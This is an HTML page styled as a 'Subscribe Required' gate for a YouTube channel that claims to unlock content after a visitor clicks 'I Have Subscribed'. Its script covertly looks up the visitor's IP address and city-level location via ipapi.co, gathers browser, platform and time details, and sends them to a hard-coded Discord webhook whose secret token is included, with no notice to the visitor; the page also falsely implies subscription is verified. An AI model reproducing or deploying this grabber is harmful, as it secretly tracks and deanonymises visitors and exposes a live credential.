<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Subscribe to Unlock</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      background: linear-gradient(to right, #0f172a, #1e3a8a);
      font-family: 'Orbitron', sans-serif;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }

    .card {
      background: rgba(30, 41, 59, 0.95);
      padding: 30px;
      border-radius: 16px;
      width: 95%;
      max-width: 500px;
      text-align: center;
      box-shadow: 0 0 25px #3b82f6;
      border: 2px solid #3b82f6;
      animation: fadeIn 1s ease-in-out;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }

    h1 {
      margin-bottom: 10px;
      color: #60a5fa;
    }

    p {
      font-size: 15px;
      color: #cbd5e1;
    }

    button {
      padding: 12px 24px;
      margin-top: 20px;
      background: #3b82f6;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: bold;
      color: white;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background: #2563eb;
    }

    button:disabled {
      background: #1e3a8a;
      cursor: not-allowed;
    }

    #expiresBox {
      margin-top: 16px;
      font-size: 14px;
      color: #93c5fd;
    }

    #details {
      margin-top: 16px;
      color: #94a3b8;
      font-size: 13px;
      white-space: pre-line;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>üîê Subscribe Required</h1>
    <p>You must subscribe to <b>TheMugenKing</b> channel to continue.</p>

    <a href="https://youtube.com/@themugenking" target="_blank">
      <button id="subscribeBtn">üì∫ Subscribe Now</button>
    </a>

    <button id="continueBtn" disabled>‚úÖ I Have Subscribed</button>

    <div id="expiresBox" style="display:none;"></div>
    <div id="details"></div>
  </div>

  <script>
    const subscribeBtn = document.getElementById("subscribeBtn");
    const continueBtn = document.getElementById("continueBtn");
    const expiresBox = document.getElementById("expiresBox");
    const details = document.getElementById("details");

    let clicked = false;

    subscribeBtn.addEventListener("click", () => {
      clicked = true;
      subscribeBtn.innerText = "‚úÖ Link Opened";
      setTimeout(() => {
        continueBtn.disabled = false;
      }, 5000);
    });

    continueBtn.addEventListener("click", async () => {
      if (!clicked) return;

      const now = new Date();
      const expires = new Date(now.getTime() + 24 * 60 * 60 * 1000);

      function updateCountdown() {
        const diff = expires - new Date();
        if (diff <= 0) {
          expiresBox.innerText = "‚ùå Your access has expired.";
          return;
        }
        const h = Math.floor(diff / 3600000);
        const m = Math.floor((diff % 3600000) / 60000);
        const s = Math.floor((diff % 60000) / 1000);
        expiresBox.innerText = `‚è≥ Expires in: ${h}h ${m}m ${s}s`;
      }

      expiresBox.style.display = "block";
      updateCountdown();
      setInterval(updateCountdown, 1000);

      // Device + Browser + Location Info
      const ip = await fetch("https://ipapi.co/json").then(res => res.json());
      const nowData = new Date();

      const info = {
        location: `${ip.city}, ${ip.region}, ${ip.country_name}`,
        ip: ip.ip,
        device: /mobile/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
        browser: (() => {
          const ua = navigator.userAgent;
          if (ua.includes("Chrome")) return "Chrome";
          if (ua.includes("Firefox")) return "Firefox";
          if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
          return "Unknown";
        })(),
        os: navigator.platform,
        time: nowData.toLocaleTimeString(),
        date: nowData.toLocaleDateString(),
        day: nowData.toLocaleDateString("en-US", { weekday: "long" }),
        year: nowData.getFullYear()
      };

      details.innerText = `You Have Subscribed - Our Channel, It Will Automatically Open Soon, If You Unsubscribe, We Will Delete Your Whitelist User, Now type 'Subscribe' in the box below to unlock`;

      // Webhook to Discord
      fetch("https://discord.com/api/webhooks/1381777547049701477/hys7-bUMIqdyUlt6un9fHqhWUmPgSLMofqYJa_kWRBoh6CAZRMVCeqR2kuza4aHIvCv9", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `üîê **New Access Verified!**
üìç **Location**: ${info.location}
üíª **Device**: ${info.device} on ${info.browser}
üñ• **Platform**: ${info.os}
üïí **Time**: ${info.time} | ${info.day}, ${info.date}
üåê **IP**: ${info.ip}
üìÖ **Year**: ${info.year}`
        })
      });
    });
  </script>
</body>
</html>
